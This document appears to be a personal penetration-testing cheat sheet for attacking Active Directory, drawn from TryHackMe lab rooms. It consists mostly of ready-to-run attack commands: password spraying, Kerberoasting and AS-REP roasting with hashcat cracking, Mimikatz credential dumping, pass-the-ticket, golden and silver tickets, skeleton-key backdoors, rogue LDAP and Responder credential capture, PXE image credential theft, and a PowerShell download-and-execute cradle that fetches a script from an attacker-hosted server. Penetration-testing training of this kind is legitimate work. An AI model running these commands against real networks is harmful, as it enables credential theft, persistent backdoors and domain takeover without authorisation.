# Active Directory

### Kerbrute Installation &#x20;

&#x20;Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute && chmod +x kerbrute 
```

### Impacket Installation &#x20;

```
wget https://github.com/fortra/impacket/archive/refs/tags/impacket_0_9_19.tar.gz
tar xvf impacket_0_9_19.tar.gz 
cd /root/impacket-impacket_0_9_19
pip install .
```

### Download wordlists

```
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
```

## Information Gathering

**Examples**

[#active-directory-a-d-environment](../../walkthroughs/tryhackme/the-lay-of-the-land.md#active-directory-a-d-environment "mention")

The output of the systeminfo provides information about the machine, including the operating system name and version, hostname, and other hardware information as well as the AD domain.

**Victim(cmd)**

```
systeminfo | findstr Domain
```

### Users

**Examples**

[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

We can use the `net` command to list all users in the AD domain by using the `user` sub-option:

**Victim(cmd)**

```
net user /domain
```

This will return all AD users for us and can be helpful in determining the size of the domain to stage further attacks. We can also use this sub-option to enumerate more detailed information about a single user account:

**Victim(cmd)**

```
net user $USERNAME /domain
```

**Victim(powershell)**

```
Get-ADUser -Identity $USERNAME -Server $DOMAINHOSTNAME -Properties *
```

The parameters are used for the following:

* \-Identity - The account name that we are enumerating
* \-Properties - Which properties associated with the account will be shown, \* will show all properties
* \-Server - Since we are not domain-joined, we have to use this parameter to point it to our domain controller

### Groups

**Examples**

[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

We can use the `net` command to enumerate the groups of the domain by using the `group` sub-option:

**Victim(cmd)**

```
net group /domain
```

This information can help us find specific groups to target for goal execution. We could also enumerate more details such as membership to a group by specifying the group in the same command:

**Victim(cmd)**

```
net group "$GROUPNAME" /domain
```

**Victim(powershell)**

```
Get-ADGroup -Identity "$GROUPNAME" -Server $DOMAINHOSTNAME
```

We can also enumerate group membership using the `Get-ADGroupMember` cmdlet:

**Victim(powershell)**

```
Get-ADGroupMember -Identity "$GROUPNAME" -Server $DOMAINHOSTNAME
```

## SharpHound and Bloodhound

**Examples**

[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

**Bloodhound Examples**

[exploiting-active-directory.md](../../walkthroughs/tryhackme/exploiting-active-directory.md "mention")[vulnnet-active.md](../../walkthroughs/tryhackme/vulnnet-active.md "mention")

You will often hear users refer to Sharphound and Bloodhound interchangeably. However, they are not the same. Sharphound is the enumeration tool of Bloodhound. It is used to enumerate the AD information that can then be visually displayed in Bloodhound. Bloodhound is the actual GUI used to display the AD attack graphs. Therefore, we first need to learn how to use Sharphound to enumerate AD before we can look at the results visually using Bloodhound.

There are three different Sharphound collectors:

* Sharphound.ps1 - PowerShell script for running Sharphound. However, the latest release of Sharphound has stopped releasing the Powershell script version. This version is good to use with RATs since the script can be loaded directly into memory, evading on-disk AV scans.\

* Sharphound.exe - A Windows executable version for running Sharphound.
* AzureHound.ps1 - PowerShell script for running Sharphound for Azure (Microsoft Cloud Computing Services) instances. Bloodhound can ingest data enumerated from Azure to find attack paths related to the configuration of Azure Identity and Access Management.

```
Sharphound.exe --CollectionMethods $CollectionMethods  --Domain $DOMAINNAME --ExcludeDCs
```

Parameters explained:

* CollectionMethods - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
* Domain - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
* ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.

You can find all the various Sharphound parameters [here](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html). It is good to overview the other parameters since they may be required depending on your red team assessment circumstances.

Using your SSH PowerShell session from the previous task, copy the Sharphound binary to your AD user's Documents directory:

**Victim(powershell)**

```
copy C:\Tools\Sharphound.exe ~\Documents\
cd ~\Documents\
```

We will run Sharphound using the All and Session collection methods:

**Victim(powershell)**

```
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
```

<figure><img src="../../.gitbook/assets/image (39) (3) (1).png" alt=""><figcaption></figcaption></figure>

It will take about 1 minute for Sharphound to perform the enumeration. In larger organisations, this can take quite a bit longer, even hours to execute for the first time. Once completed, you will have a timestamped ZIP file in the same folder you executed Sharphound from.

<figure><img src="../../.gitbook/assets/image (27) (5) (2).png" alt=""><figcaption></figcaption></figure>

In another Terminal tab, run `bloodhound --no-sandbox`. This will show you the authentication GUI:

<figure><img src="../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

The default credentials for the neo4j database will be `neo4j:neo4j`. Use this to authenticate in Bloodhound. To import our results, you will need to recover the ZIP file from the Windows host. The simplest way is to use SCP command on your AttackBox:

```
scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .
```

Once you provide your password, this will copy the results to your current working directory. Drag and drop the ZIP file onto the Bloodhound GUI to import into Bloodhound. It will show that it is extracting the files and initiating the import.

<figure><img src="../../.gitbook/assets/image (24) (3).png" alt=""><figcaption></figcaption></figure>

Once all JSON files have been imported, we can start using Bloodhound to enumerate attack paths for this specific domain.\


### Attack Paths

There are several attack paths that Bloodhound can show. Pressing the three stripes next to "Search for a node" will show the options. The very first tab shows us the information regarding our current imports.

<figure><img src="../../.gitbook/assets/image (38) (2).png" alt=""><figcaption></figcaption></figure>

Note that if you import a new run of Sharphound, it would cumulatively increase these counts. First, we will look at Node Info. Let's search for our AD account in Bloodhound. You must click on the node to refresh the view. Also note you can change the label scheme by pressing LeftCtrl.

<figure><img src="../../.gitbook/assets/image (41) (3).png" alt=""><figcaption></figcaption></figure>

We can see that there is a significant amount of information returned regarding our use. Each of the categories provides the following information:

* Overview - Provides summaries information such as the number of active sessions the account has and if it can reach high-value targets.\

* Node Properties - Shows information regarding the AD account, such as the display name and the title.\

* Extra Properties - Provides more detailed AD information such as the distinguished name and when the account was created.\

* Group Membership - Shows information regarding the groups that the account is a member of.\

* Local Admin Rights - Provides information on domain-joined hosts where the account has administrative privileges.\

* Execution Rights - Provides information on special privileges such as the ability to RDP into a machine.\

* Outbound Control Rights - Shows information regarding AD objects where this account has permissions to modify their attributes.\

* Inbound Control Rights -  Provides information regarding AD objects that can modify the attributes of this account.

If you want more information in each of these categories, you can press the number next to the information query. For instance, let's look at the group membership associated with our account. By pressing the number next to "First Degree Group Membership", we can see that our account is a member of two groups.

<figure><img src="../../.gitbook/assets/image (1) (2) (1) (4).png" alt=""><figcaption></figcaption></figure>

Next, we will be looking at the Analysis queries. These are queries that the creators of Bloodhound have written themselves to enumerate helpful information.

<figure><img src="../../.gitbook/assets/image (4) (1) (10).png" alt=""><figcaption></figcaption></figure>

Under the Domain Information section, we can run the Find all Domain Admins query. Note that you can press LeftCtrl to change the label display settings.

<figure><img src="../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

The icons are called nodes, and the lines are called edges. Let's take a deeper dive into what Bloodhound is showing us. There is an AD user account with the username of T0\_TINUS.GREEN, that is a member of the group Tier 0 ADMINS. But, this group is a nested group into the DOMAIN ADMINS group, meaning all users that are part of the Tier 0 ADMINS group are effectively DAs.

Furthermore, there is an additional AD account with the username of ADMINISTRATOR that is part of the DOMAIN ADMINS group. Hence, there are two accounts in our attack surface that we can probably attempt to compromise if we want to gain DA rights. Since the ADMINISTRATOR account is a built-in account, we would likely focus on the user account instead.\


Each AD object that was discussed in the previous tasks can be a node in Bloodhound, and each will have a different icon depicting the type of object it is. If we want to formulate an attack path, we need to look at the available edges between the current position and privileges we have and where we want to go. Bloodhound has various available edges that can be accessed by the filter icon:

<figure><img src="../../.gitbook/assets/image (47) (3) (1).png" alt=""><figcaption></figcaption></figure>

These are also constantly being updated as new attack vectors are discovered. We will be looking at exploiting these different edges in a future network. However, let's look at the most basic attack path using only the default and some special edges. We will run a search in Bloodhound to enumerate the attack path. Press the path icon to allow for path searching.

<figure><img src="../../.gitbook/assets/image (5) (4) (3).png" alt=""><figcaption></figcaption></figure>

Our Start Node would be our AD username, and our End Node will be the Tier 1 ADMINS group since this group has administrative privileges over servers.

<figure><img src="../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>

If there is no available attack path using the selected edge filters, Bloodhound will display "No Results Found". Note, this may also be due to a Bloodhound/Sharphound mismatch, meaning the results were not properly ingested. Please make use of Bloodhound v4.1.0. However, in our case, Bloodhound shows an attack path. It shows that one of the T1 ADMINS, ACCOUNT,  broke the tiering model by using their credentials to authenticate to THMJMP1, which is a workstation. It also shows that any user that is part of the DOMAIN USERS group, including our AD account, has the ability to RDP into this host.

We could do something like the following to exploit this path:

1. Use our AD credentials to RDP into THMJMP1.
2. Look for a privilege escalation vector on the host that would provide us with Administrative access.
3. Using Administrative access, we can use credential harvesting techniques and tools such as Mimikatz.
4. Since the T1 Admin has an active session on THMJMP1, our credential harvesting would provide us with the NTLM hash of the associated account.

This is a straightforward example. The attack paths may be relatively complex in normal circumstances and require several actions to reach the final goal. If you are interested in the exploits associated with each edge, the following [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) provides an excellent guide. Bloodhound is an incredibly powerful AD enumeration tool that provides in-depth insights into the AD structure of an attack surface. It is worth the effort to play around with it and learn its various features.



Add this line to SharpHound.ps1 before transferring so I could run the command right away

<figure><img src="../../.gitbook/assets/image (3) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
powershell -ep bypass
.\SharpHound.ps1
```

**Kali**

```
apt-get install bloodhound
neo4j console
bloodhound --no-sandbox
```

### Find all Domain Admins

<figure><img src="../../.gitbook/assets/image (15) (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (84) (1) (1).png" alt=""><figcaption></figcaption></figure>

### List all Kerberostable accounts

<figure><img src="../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>



##



### AD Objects

**Examples**

[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

A more generic search for any AD objects can be performed using the `Get-ADObject` cmdlet. For example, if we are looking for all AD objects that were changed after a specific date:

**Victim(powershell)**

```
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
```

### Domains

**Examples**

[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

We can use `Get-ADDomain` to retrieve additional information about the specific domain:

**Victim(powershell)**

```
Get-ADDomain -Server $DOMAINHOSTNAME
```

### Password Policy

**Examples**

[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

We can use the `net` command to enumerate the password policy of the domain by using the `accounts` sub-option:

**Victim(cmd)**

```
net accounts /domain
```

This will provide us with helpful information such as:

* Length of password history kept. Meaning how many unique passwords must the user provide before they can reuse an old password.
* The lockout threshold for incorrect password attempts and for how long the account will be locked.
* The minimum length of the password.
* The maximum age that passwords are allowed to reach indicating if passwords have to be rotated at a regular interval.

This information can benefit us if we want to stage additional password spraying attacks against the other user accounts that we have now enumerated. It can help us better guess what single passwords we should use in the attack and how many attacks can we run before we risk locking accounts. However, it should be noted that if we perform a blind password spraying attack, we may lock out accounts anyway since we did not check to determine how many attempts that specific account had left before being locked.\


You can find the full range of options associated with the net command [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems). Play around with these net commands to gather information about specific users and groups.\


#### Benefits

* No additional or external tooling is required, and these simple commands are often not monitored for by the Blue team.
* We do not need a GUI to do this enumeration.
* VBScript and other macro languages that are often used for phishing payloads support these commands natively so they can be used to enumerate initial information regarding the AD domain before more specific payloads are crafted.

#### Drawbacks

* The `net` commands must be executed from a domain-joined machine. If the machine is not domain-joined, it will default to the WORKGROUP domain.
* The `net` commands may not show all information. For example, if a user is a member of more than ten groups, not all of these groups will be shown in the output.

### Altering AD Objects

**Examples**

[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

The great thing about the AD-RSAT cmdlets is that some even allow you to create new or alter existing AD objects. However, our focus for this network is on enumeration. Creating new objects or altering existing ones would be considered AD exploitation, which is covered later in the AD module.

However, we will show an example of this by force changing the password of our AD user by using the `Set-ADAccountPassword` cmdlet:

**Victim(powershell)**

```
Set-ADAccountPassword -Identity $USERNAME -Server $DOMAINHOSTNAME -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```





## NTLM Authenticated Services

**Examples**

[#ntlm-authenticated-services](../../walkthroughs/tryhackme/breaching-active-directory.md#ntlm-authenticated-services "mention")

**Kali**

```
unzip passwordsprayer.zip 
python /root/Rooms/BreachingAD/task3/ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a "http://ntlmauth.za.tryhackme.com"
```



## Users and Groups Management

Examples

[#users-and-groups-management](../../walkthroughs/tryhackme/the-lay-of-the-land.md#users-and-groups-management "mention")

Use the Get-ADUser -Filter \* -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain. How many users are available?

**Victim(powershell)**

```
 Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"
```

## Enumeration w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist

**Example**

[#enumeration-w-kerbrute](../../walkthroughs/tryhackme/attacking-kerberos.md#enumeration-w-kerbrute "mention")

**Kali**

```
./kerbrute userenum --dc $DOMAINCONTROLLER -d $DOMAIN $USERLIST.txt
```

## Harvesting & Brute-Forcing Tickets w/ Rubeus

**Example**

[#harvesting-and-brute-forcing-tickets-w-rubeus](../../walkthroughs/tryhackme/attacking-kerberos.md#harvesting-and-brute-forcing-tickets-w-rubeus "mention")

Harvest tickets with Rubeus

**Victim**

```
Rubeus.exe harvest /interval:30
```



Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command. This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

**Victim**

```
echo $VICTIM $DOMAINCONTROLLERHOSTNAME >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:$PASSWORD /noticket
```



## Kerberoasting&#x20;

### Kerberoasting #1 - Rubeus&#x20;

**Example**

[#kerberoasting-1-rubeus](../../walkthroughs/tryhackme/attacking-kerberos.md#kerberoasting-1-rubeus "mention")

This will dump the Kerberos hash of any kerberoastable users.

**Victim**

```
Rubeus.exe kerberoast
```

Copy the hashes from the command prompt onto the attacker machine and put it into a .txt file so we can crack it with hashcat. Below command removes all the tabs and formats it properly for hashcat. If you don't format it properly than hashcat will error out.

**Kali**

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n' | sed 's/$krb5tgs$23$*/\n&/g'  > hash.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Hashcat found the passwords for both of the hashes.

```
hashcat -m 13100 -a 0 hash.txt Pass.txt --show
```



### Kerberoasting #2  - Impacket

**Example**

[#kerberoasting-2-impacket](../../walkthroughs/tryhackme/attacking-kerberos.md#kerberoasting-2-impacket "mention")

```
sudo python3.9 /root/test/impacket/examples/GetUserSPNs.py $DOMAINHOSTNAME/$MACHINENAME:$PASSWORD -dc-ip $DCIP -request > hashes.txt
```

Hashes were found for the same two accounts when doing this with Rubeus.

```
hashcat -m 13100 -a 0 hashes.txt Pass.txt
hashcat -m 13100 -a 0 hashes.txt Pass.txt --show
```

## Powershell

**Examples**

[#kerberoasting](../../walkthroughs/tryhackme/corp.md#kerberoasting "mention")

Run the below command from the Administrator account we just got access to.

**Victim(powershell)**

```
setspn -T medin -Q ​ */*
```

<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to Invoke-Kerberoast.ps1 so it runs automatically once downloaded

```
 Invoke-Kerberoast -OutputFormat hashcat ​ |fl
```

**Victim(powershell)**

```
powershell -ep bypass
powershell -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$KALI:81/Invoke-Kerberoast.ps1'))"
```

<figure><img src="../../.gitbook/assets/image (9) (4).png" alt=""><figcaption></figcaption></figure>

Run this to get rid of all the spaces.

**Kali**

```
cat hash.txt | sed 's/[[:space:]]//g' |tr -d '\n' | sed 's/$krb5tgs$23$*/\n&/g' > hash.txt
```

Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.

**Kali**

```
hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyo.txt --force
hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt --force --show
```

##

## AS-REP Roasting w/ Rubeus

**Example**

[#as-rep-roasting-w-rubeus](../../walkthroughs/tryhackme/attacking-kerberos.md#as-rep-roasting-w-rubeus "mention")

**Victim**

```
Rubeus.exe asreproast
```

**Kali**

Transfer the hash from the target machine over to kali and put the hash into a txt file. Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User... .The below command does the replace and clean up the output so hashcat can recognize the hashes.

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n'| sed 's/$krb5asrep/\n&/g' | sed  's/$krb5asrep/$krb5asrep$23/g'  > hash.txt
hashcat -m 18200 hash.txt Pass.txt
```

Crack hashes

```
hashcat -m 18200 hash.txt Pass.txt --show
```

## Pass the Ticket w/ mimikatz

**Example**

[#pass-the-ticket-w-mimikatz](../../walkthroughs/tryhackme/attacking-kerberos.md#pass-the-ticket-w-mimikatz "mention")

### Prepare Mimikatz & Dump Tickets

**Victim**

```
mimikatz.exe
```

**Victim - Mimikatz**

```
privilege::debug
sekurlsa::tickets /export
```

### Pass the Ticket w/ Mimikatz

Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket. Copy paste one of the kirbi tickets given from the command sekurlsa::tickets /export

**Victim - Mimikatz**

```
kerberos::ptt $TICKET.kirbi
```

Here were just verifying that we successfully impersonated the ticket by listing our cached ticket.

**Victim**

```
klist
```

You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.

**Victim**

```
dir \\$VICTIM\admin$
```

## Golden/Silver Ticket Attacks w/ mimikatz

**Examples**

[#golden-silver-ticket-attacks-w-mimikatz](../../walkthroughs/tryhackme/attacking-kerberos.md#golden-silver-ticket-attacks-w-mimikatz "mention")[#golden-ticket-attacks-w-mimikatz](../../walkthroughs/tryhackme/post-exploitation-basics.md#golden-ticket-attacks-w-mimikatz "mention")

**Victim**

```
mimikatz.exe
```

This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

**Victim(Mimikatz)**

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

### Create a Golden/Silver Ticket

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

#### Golden Ticket

This is the command for creating a golden ticket.

**Victim - Mimikatz**

```
Kerberos::golden /user:Administrator /domain:$DOMAINCONTROLLERHOSTNAME /sid:$SID  /krbtgt:$NTLMHASH
```

#### Use the Golden Ticket to access other machine

This will open a new command prompt with elevated privileges to all machines.Access other Machines! - You will now have another command prompt with access to all other machines on the network.&#x20;

**Victim(Mimikatz)**

```
misc::cmd
```

This doesn't actually work. Because of how tryhackme is setup but you would then be able to access other machines. In the example below you'd need to find out what other machines exists to pull this off.

**Victim**

```
dir \\Desktop-1\c$
PsExec.exe \\Desktop-1 cmd.exe
```

#### **Silver Ticket**

This is the command for creating a golden ticket as well but to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into **sid**, and change the id to 1103. &#x20;

**Victim - Mimikatz**

```
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860  /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
```

### Use the Golden/Silver Ticket to access other machines

```
misc::cmd
```

NTLM hash of Administrator

```
lsadump::lsa /inject /name:Administrator 
```



## Dumping hashes w/ mimikatz

**Example**

[#dumping-hashes-w-mimikatz](../../walkthroughs/tryhackme/post-exploitation-basics.md#dumping-hashes-w-mimikatz "mention")

**Victim**

```
mimikatz.exe
```

**Victim(Mimikatz)**

```
privilege::debug
lsadump::lsa /patch
```

Copy to Kali output back to Kali

Output only the hashes and remove all duplicates into a new file.

**Kali**

```
cat hashes.txt | grep NTLM | awk -F ":" '{print $2}' | grep "\S" | sed 's/^[ \t]*//'  | sort | uniq > hash.txt
```

<figure><img src="../../.gitbook/assets/image (1) (2) (5) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show
```

## Kerberos Backdoors w/ mimikatz

**Example**

[#kerberos-backdoors-w-mimikatz](../../walkthroughs/tryhackme/attacking-kerberos.md#kerberos-backdoors-w-mimikatz "mention")

**Victim**&#x20;

```
mimikatz.exe
```

**Victim (Mimikatz)**

```
privilege::debug
misc::skeleton
```





## LDAP Bind Credentials

**Examples**&#x20;

[#ldap-bind-credentials](../../walkthroughs/tryhackme/breaching-active-directory.md#ldap-bind-credentials "mention")

**Kali**

```
service slapd stop
nc -lvp 389
```

<figure><img src="../../.gitbook/assets/image (9) (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14) (10).png" alt=""><figcaption></figcaption></figure>

### Hosting a Rogue LDAP Server

**Examples**

[#hosting-a-rogue-ldap-server](../../walkthroughs/tryhackme/breaching-active-directory.md#hosting-a-rogue-ldap-server "mention")

**Kali**

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

<figure><img src="../../.gitbook/assets/image (13) (1) (4) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
vi olcSaslSecProps.ldif
```

**olcSaslSecProps.ldif**

```
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:

* olcSaslSecProps: Specifies the SASL security properties
* noanonymous: Disables mechanisms that support anonymous login
* minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the ldif file to patch our LDAP server using the following:

**Kali**

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

**Before**

<figure><img src="../../.gitbook/assets/image (12) (10).png" alt=""><figcaption></figcaption></figure>

**After**

<figure><img src="../../.gitbook/assets/image (11) (1) (3).png" alt=""><figcaption></figcaption></figure>



## Capturing LDAP Credentials

**Examples**

[#capturing-ldap-credentials](../../walkthroughs/tryhackme/breaching-active-directory.md#capturing-ldap-credentials "mention")

Our rogue LDAP server has now been configured. When we click the "Test Settings" at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx), the authentication will occur in clear text. If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:



<figure><img src="../../.gitbook/assets/image (6) (5) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sudo tcpdump -SX -i breachad tcp port 389
```

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (9).png" alt=""><figcaption></figcaption></figure>



## Authentication Relays

**Examples**

[#authentication-relays](active-directory.md#authentication-relays "mention")

**Kali**

```
sudo service slapd stop
sudo responder -I breachad
```

<figure><img src="../../.gitbook/assets/image (7) (5) (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (9) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hashcat -m 5600 hash.txt passwordlist.txt --force 
hashcat -m 5600 hash.txt passwordlist.txt --force --show
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

## Microsoft Deployment Toolkit

**Examples**

[#microsoft-deployment-toolkit](../../walkthroughs/tryhackme/breaching-active-directory.md#microsoft-deployment-toolkit "mention")

**Kali**

```
ssh thm@THMJMP1.za.tryhackme.com
Password: Password1@
```

**Victim**

```
cd Documents
mkdir thm
copy C:\powerpxe thm
cd thm
```

**Victim**

```
tftp -i $THMMDTIP GET "\Tmp\x64{39...28}.bcd" conf.bcd
```

**Victim**

```
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
```

**Victim**

```
tftp -i $THMMDTIP  GET "<PXE Boot Image Location>" pxeboot.wim
```

**Victim**

```
Get-FindCredentials -WimFile pxeboot.wim
```

###

































